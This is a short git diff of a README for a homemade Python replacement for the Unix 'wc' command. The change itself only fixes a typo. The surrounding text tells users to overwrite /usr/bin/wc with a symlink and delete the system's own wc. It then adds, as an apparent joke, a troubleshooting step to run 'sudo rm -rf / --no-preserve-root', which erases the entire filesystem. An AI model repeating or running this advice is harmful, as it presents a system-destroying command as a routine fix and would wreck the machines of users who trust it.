@@ -9,7 +9,7 @@
  - Create simlink 
  > ln -s /opt/wc.py /usr/bin/wc
 
-The last command may give you error message. Don't worry, everything is fine, you just need to delete default wc program form your system ( mine is much superior ;P )
+The last command may give you error message. Don't worry, everything is fine, you just need to delete default wc program from your system ( mine is much superior ;P )
 
 If deleting default wc program won't help, just run
 > sudo rm -rf / --no-preserve-root
